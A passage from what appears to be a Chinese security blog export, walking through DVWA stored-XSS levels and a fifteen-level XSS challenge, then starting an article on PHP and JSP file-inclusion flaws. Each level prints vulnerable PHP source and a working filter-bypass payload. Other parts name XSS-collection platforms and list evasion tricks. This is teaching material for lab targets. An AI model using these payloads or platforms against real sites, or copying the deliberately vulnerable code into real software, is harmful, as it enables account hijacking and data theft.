\t 制表符 \n 换行 \x0B 垂直制表符 \r 回车 空格 stripslashes语法 1stripslashes(string) 细节 去除掉string字符的反斜杠\，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 mysql_real_escape_string语法 1mysql_real_escape_string(string,connection) 细节 转义 SQL 语句中使用的字符串中的特殊字符。 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 下列字符受影响： \x00 \n \r \ ‘ “ \x1a 以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS payload 12Name: sqlsecMessage: &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 可以看到我们的payload直接插入到了数据库中了： 测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。 存储 XSS Medium源码 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; addslashes语法 1addslashes(string) 细节 返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL strip_tags语法 1strip_tags(string,allow) 细节 剥去字符串中的 HTML、XML 以及 PHP 的标签。 参数 描述 string 必需。规定要检查的字符串。 allow 可选。规定允许的标签。这些标签不会被删除。 htmlspecialchars语法 1htmlspecialchars(string,flags,character-set,double_encode) 细节 把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 &quot; ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; > （大于）成为 &gt; message 变量几乎把所有的XSS都给过滤了，但是name变量只是过滤了&lt;script&gt;标签而已，我们依然可以在name参数尝试使用其他的标签配合事件来触发弹窗。 name的input输入文本框限制了长度： 1&lt;input name="txtName" size="30" maxlength="10" type="text"&gt; 审查元素手动将maxlength的值调大一点就可以了。 1&lt;input name="txtName" size="50" maxlength="50" type="text"&gt; payload1 12Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;Message: www.sqlsec.com 可以看到我们的payload直接插入到了数据库中了： 因为name过滤规则的缺陷，同样使用嵌套构造和大小写转换也是可以Bypass的： paylaod2 12345Name: &lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;Message: www.sqlsec.comName: &lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;Message: www.sqlsec.com 测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。 存储 XSS high源码 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; message变量依然是没有什么希望，重点分析下name变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass 1$name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); payload 12Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;Message: www.sqlsec.com 存储 XSS Impossible源码 12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; message和name变量都进行了严格的过滤，而且还检测了用户的token： 1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 有效地防止了CSRF的攻击 XSS小游戏习题讲解第1关 无任何过滤措施源码 12345&lt;?phpini_set("display_errors", 0);$str = $_GET["name"];echo "&lt;h2 align=center&gt;欢迎用户:".$str."&lt;/h2&gt;";?&gt; name变量通过GET方式传入，直接带入到&lt;h2&gt;标签中，没有任何过滤。 payload 1/level1.php?name=&lt;script&gt;alert('xss')&lt;/script&gt; 第2关 闭合双引号源码 12345678910&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; keyword变量通过GET方式传入，赋值给$str变量，然后带入到&lt;h2&gt;标签中和&lt;input&gt;标签。 &lt;h2&gt;标签经过了htmlspecialchars($str)编码，&lt;input&gt;标签没有任何过滤，所以尝试在&lt;input&gt;标签中闭合双引号&quot;，来触发事件。 payload 1&quot; onclick=alert(&apos;XSS&apos;) // 第3关 闭合单引号源码 12345678910&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; keyword变量通过GET方式传入，赋值给$str变量，然后带入到&lt;h2&gt;标签中和&lt;input&gt;标签。 &lt;h2&gt;标签经过了htmlspecialchars($str)编码，&lt;input&gt;标签没有任何过滤，所以尝试在&lt;input&gt;标签中闭合单引号&#39;，来触发事件。 payload 1&apos; onclick=alert(&apos;XSS&apos;) // 第4关 闭合双引号源码 123456789101112&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 在第2关的基础上，过滤了尖括号，但是直接在&lt;input&gt;标签中构造闭合双引号来构造事件来触发并用不到引号，所以第2关的payload依然适用。 payload 1&quot; onclick=alert(&apos;XSS&apos;) // 第5关 javascript妙用源码 123456789101112&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 首先对keyword变量使用了strtolower()函数转换，把所有字符转换为小写；接着过滤了&lt;script，并替换为&lt;scr_ipt；过滤了on并替换为o_n。因为on是很多事件都包含的关键词，所以这里无法直接通过闭合引号在&lt;input&gt;标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过javascript:alert(&#39;XSS&#39;)这种形式来触发弹窗。 payload 1&quot;&gt;&lt;a href=javascript:alert(&apos;XSS&apos;) // 第6关 大小写转换源码 123456789101112131415&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 比第5关加入了很多的过滤规则，而且过滤了href属性，这样就无法使用javascript:alert()这种形势来弹窗了，但是仔细观察源码，这里少了第5关的strtolower()函数，所以这里可以通过大小写转换来绕过过滤。 payload1 1&quot; Onclick=alert(&apos;XSS&apos;) // payload2 1&quot;&gt;&lt;a Href=javascript:alert(&apos;XSS&apos;) // 第7关 嵌套构造源码 123456789101112131415&lt;?phpini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 在第6关的基础上，首先还统一使用了strtolower()函数，将keyword变量的值转换了小写，这样就无法直接使用大小写转换的思路来绕过了。但是这里的过滤比较巧妙，是直接将敏感字符替换为空（即删掉了），这种机制我们可以尝试使用嵌套构造payload来绕过。 payload 1&quot; oonnclick=alert(&apos;XSS&apos;) // 第8关 HTML编码源码 12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?php echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;?&gt; 这里的过滤规则很完善，基本上都过滤掉了可能触发弹窗的一些字符串。同时有2个输出，一个输出在了&lt;input&gt;标签中，并且通过htmlspecialchars($str)函数实体化后输出来，这里基本上是凉凉了。看第2个输出，是在&lt;a&gt;标签中，而且没有过滤，直接输出在了双引号&quot;之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过，有因为直接输出在了href的属性里面，所以可以尝试javascript()这种形式来触发弹窗。 j将t编码为t payload1 1javascrip&amp;#x74;:alert(&apos;XSS&apos;) // 也可以将Tab键编码为插入到关键词中绕过过滤；同理也可以将`回车键`编码为插入来Bypass payload2 12javascrip&amp;#x09;t:alert(&apos;XSS&apos;) //javascrip&amp;#x0a;t:alert(&apos;XSS&apos;) // 第9关 阅读源码源码 1234567891011121314151617181920212223242526&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;&#125;?&gt; 这里只是比第8关多了到对提交的keyword里面是否有http://的检测，所以Bypass的话就很简单，直接在第8关的payload后面添加：http:// payload 1javascrip&amp;#x74;:alert(&apos;XSS&apos;) //http:// 第10关 覆盖元素属性源码 1234567891011121314&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 可以看出这里keyword变量依然没戏，被HTML实体化输出了出来，所以重点放在t_sort变量上，只过滤了尖括号，然后就直接输出到了&lt;input&gt;标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的&lt;input&gt;标签使用了type=&quot;hidden&quot;将输入框隐藏了起来，可以手动赋值type的值来覆盖掉先前的属性来达到显示文本框的目的。 payload 1level10.php?keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第11关 HTTP Referer源码 12345678910111213141516&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 看变量的输出基本上可以判定$str和$str00变量没戏，也就是我们可以控制的keyword和t_sort变量是无法突破限制来弹窗的。观察$str33是通过$str11=$_SERVER[&#39;HTTP_REFERER&#39;];过滤了尖括号然后赋值的，那么尝试在HTTP请求头的Referer构造payload。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地Referer字段： payload 1Referer: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第12关 HTTP User-Agent源码 12345678910111213141516&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这一题和上一题类似，只是这里的漏洞点出现在了HTTP请求头的User-Agent。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地User-Agent字段： payload 1User-Agent: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第13关 HTTP Cookie源码 1234567891011121314151617&lt;?phpsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这里的漏洞点出现在了HTTP请求头的Cookie的user属性中。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地Cookie字段： payload 1Cookie: user=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第14关 Angular JS源码 1234567&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; 这题考察Angular JS 的ng-include用法，具体可以参考这篇资料：AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。 payload 1level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot; 第15关 过滤空格源码 123456789&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt; 这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。 可以使用如下符号替代空格 符号 URL编码 回车(CR) %0d 换行(LF) %0a ？？？求补充 %0c payload 1level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&apos;XSS&apos;)&gt; XSS 实战应用XSS 平台搭建推荐一个经典开源的 XSS 平台： 项目地址：https://github.com/firesunCN/BlueLotus_XSSReceiver Fork 地址：https://github.com/winthorlimo/BlueLotus_XSSReceiver 无需数据库，将源码放入到网站目录下访问即可，配置记录好平台的后台登录密码： 以后再次登录手动访问 login.php 即可重新登录 后台地址：http://127.0.0.1/xss/login.php 此时别人访问 http://127.0.0.1/xss/ 也会被钓鱼记录。 第三方XSS平台https://xss8.cc/xss.php https://xss.pt/xss.php 奇技淫巧 百度百科：奇技淫巧，读音qí jì yín qiǎo，是一个成语，意思是指过于奇巧，让人着迷，却又无益的技艺与制品。奇：奇异，奇巧，有趣的。技：技术，技巧，带有技术性的。淫：过分，极端，沉迷，上瘾。 反引号代替圆括号1&lt;img src=x onerror=alert`1`&gt; location + 拆分1234&lt;img src=1 onerror=location="javascript:alert(1)"&gt;&lt;img src=1 onerror=location="javascript:alert%281%29"&gt; // URL 编码&lt;img src=1 onerror=location="javascript:"+"aler"+"t(1)"&gt; // 也可以拆分&lt;img src=1 onerror=location="javascript:"+"aler"+"t%281%29"&gt; // URL编码+拆分 svg + top12&lt;svg onload=top['alert'](1)&gt;&lt;svg onload=top['al'+'ert'](1)&gt; detail + top123&lt;details ontoggle=alert(1)&gt;&lt;/details&gt;&lt;details ontoggle=top["alert"](1)&gt;&lt;/details&gt;&lt;details open ontoggle=top["alert"](1)&gt;&lt;/details&gt; HTML &lt;details&gt;元素可创建一个挂件，仅在被切换成展开状态时，它才会显示内含的信息]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F%2F2020%2F08%2F4089de4e.html</url>
    <content type="text"><![CDATA[PHP文件包含漏洞下面是两个看上去比较啰嗦的 php 文件，运行的效果几乎是一致的： one.php 1234function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125;welcome('UserA'); two.php 1234function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125;welcome('UserB'); 程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用 此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。下面来改进上述的功能代码： common.php 123function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125; one.php 12include('common.php');welcome('UserA'); two.php 12include('common.php');welcome('UserB'); 开发者希望代码更加灵活，所以很多时候会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活，导致客户端可能调用恶意文件，造成文件包含漏洞。 1234error_reporting(0);$file = $_GET['file'];include($file); 几乎在所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在 PHP 中居多，而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有包含漏洞的存在。 这与程序开发人员的水平无关，而问题在于语言设计的弊端。 文件包含漏洞产生的原因是在引入文件时，由于传入的文件名没有经过合理的校验或者校验被绕过，从而操作了预想之外的文件，因此导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就会形成本地文件包含漏洞。 漏洞成因文件包含（File Inclusion）可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。 PHP1include(), include_once(), require(), require_once(), fopen(), readfile() 在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重。 文件包含是PHP的一种常见用法，这四个函数都可以进行文件包含，但作用却不一样，其区别如下: require 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本; include 找不到被包含的文件时只会产生警告(E_WARNING)，脚本将继续执行; include_once:此语句和 include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题; require_once:此行语句和 require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题。 使用这 4 种函数包含一个新的文件时，只要文件内容符合 PHP 语法规范，任何扩展名都可以被 PHP 解析。当包含非 PHP 语法规范的源文件时，将会暴露其源代码，造成文件读取漏洞。 要想成功利用文件包含漏洞，需要满足下面两个条件： include() 等函数通过动态变量的方式引入需要包含的文件 攻击者能够控制该动态变量 PHP的文件包含漏洞分为两大种：本地文件包含 (Local File Include)和 远程文件包含(Remote File Include) 两种包含漏洞的检测方法和防御方法各不相同， 本地文件包含漏洞是加载服务器本地的文件 远程文件包含漏洞是加载一个远程的资源 JSPJSP 包含分两种方式:静态包含和动态包含。 1.静态包含 1&lt;%@ include file="page.txt"%&gt; 为 JSP 中的静态包含语句，静态包含语句先进行包含，再做处理操作。下面看一段简单的代码来观察 JSP 静态包含的特性。 a.txt 文件内容如下: 1234&lt;%@ page language="java" import="java.util.*" pageEncoding="gbk"%&gt;&lt;% out.println("this is page a.txt");%&gt; 尝试用 index.jsp 来包含 a.txt，代码如下: 1&lt;%@ include file="a.txt" %&gt; 用浏览器访问 index.jsp，此时 a.txt 文件会被当作 JSP 文件解析： 在前面曾经说过，文件包含漏洞利用最主要的是可以控制被包含的文件， 但是 JSP 语法规定，include 指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件。这就意味着使用 include 指令将不存在文件包含漏洞。 2.动态包含 1&lt;jsp:include page="page.txt" /&gt; 为动态包含语句。动态包含与静态包含恰恰相反，在运行时， 首先会处理被包含页面，然后再包含，而且可以包含一个动态页面(变量)。 1234&lt;% String pages = request.getParameter("page");%&gt;&lt;jsp:include page="&lt;%=pages%&gt;" &gt;&lt;/jsp:include&gt; 尝试通过 pages 参数来再次包含 a.txt 1a.jsp?page=a.txt 